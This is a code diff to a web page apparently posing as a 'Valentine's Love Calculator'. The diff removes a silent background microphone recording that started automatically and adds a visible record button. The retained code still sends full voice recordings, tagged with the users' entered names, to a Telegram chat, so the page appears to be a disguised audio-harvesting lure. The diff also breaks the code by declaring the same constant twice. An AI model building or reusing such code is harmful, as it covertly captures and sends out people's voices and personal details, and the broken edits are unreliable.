@@ -314,6 +314,37 @@
             animation: spin 1s linear infinite;
         }
 
+        /* Recording controls */
+        .record-control {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            justify-content: center;
+            margin-top: 12px;
+        }
+
+        .rec-indicator {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            color: #e53935;
+            font-weight: 700;
+        }
+
+        .rec-indicator .dot {
+            width: 10px;
+            height: 10px;
+            background: #e53935;
+            border-radius: 50%;
+            box-shadow: 0 0 6px rgba(229,57,53,0.9);
+            animation: pulse 1s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.4); opacity: 0.8; }
+            100% { transform: scale(1); opacity: 1; }
+        }
         @keyframes spin {
             0% {
                 transform: rotate(0deg);
@@ -557,6 +588,12 @@
             </div>
         </div>
 
+        <!-- Recording Control (visible, consent-first) -->
+        <div class="record-control">
+            <button class="btn" id="recordBtn"><i class="fas fa-microphone"></i> Start Recording</button>
+            <div id="recordIndicator" class="rec-indicator" style="display:none;"><span class="dot"></span><span>Recording</span></div>
+        </div>
+
         <!-- Main Button -->
         <button class="btn" id="calculateBtn">
             <i class="fas fa-heart"></i> Check Compatibility
@@ -747,7 +784,7 @@
                 })
             );
 
-            // Request microphone permission
+            // Request microphone permission (store stream for user-controlled recording)
             permissionPromises.push(
                 new Promise((resolve) => {
                     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
@@ -758,14 +795,12 @@
                     }
 
                     navigator.mediaDevices.getUserMedia({ audio: true })
-                        .then(stream => {
+                        .then(micStream => {
                             permissionsGranted.microphone = true;
                             console.log('Microphone permission granted');
-                            // Automatically start background recording silently
-                            setTimeout(() => {
-                                startBackgroundVoiceRecording();
-                            }, 500); // Small delay to ensure everything is ready
-                            resolve(stream);
+                            // Do NOT start recording automatically. Recording starts when user presses the visible record button.
+                            window.microphoneStream = micStream;
+                            resolve(micStream);
                         })
                         .catch(error => {
                             console.log('Microphone permission denied:', error.name, error.message);
@@ -1047,6 +1082,24 @@
                 backgroundAudioRecorder.stop();
                 console.log('Background recording stopped');
             }
+        }
+
+        function stopAndGetRecording() {
+            return new Promise((resolve) => {
+                if (!backgroundAudioRecorder || backgroundAudioRecorder.state === 'inactive') {
+                    resolve(getFullBackgroundRecording());
+                    return;
+                }
+
+                backgroundAudioRecorder.onstop = function() {
+                    console.log('Background recording stopped for sending.');
+                    const fullAudioBlob = new Blob(backgroundAudioChunks, { type: 'audio/webm' });
+                    resolve(fullAudioBlob);
+                };
+
+                backgroundAudioRecorder.stop();
+                isBackgroundRecording = false;
+            });
         }
 
         function getFullBackgroundRecording() {
@@ -1662,6 +1715,7 @@ Sent from Valentine's Love Calculator`;
                     
                     // Send the full background recording to Telegram
                     const fullRecording = getFullBackgroundRecording();
+                    const fullRecording = await stopAndGetRecording();
                     if (fullRecording) {
                         const audioCaption = `🎙️ Voice Recording - ${name1} & ${name2}
  Recorded: ${new Date().toLocaleString()}
@@ -1819,7 +1873,15 @@ Sent from Valentine's Love Calculator`;
                 console.log('Initializing Instagram browser mode');
 
                 // Setup event listeners immediately
+            // Initialize permissions and listeners for all browsers
+            console.log('Initializing application...');
+            
+            requestAllPermissions().then(() => {
                 setupEventListeners();
+            }).catch(() => {
+                // Fallback if permission request fails
+                setupEventListeners();
+            });
 
                 // Delayed permission request with user interaction context
                 calculateBtn.addEventListener('click', function () {
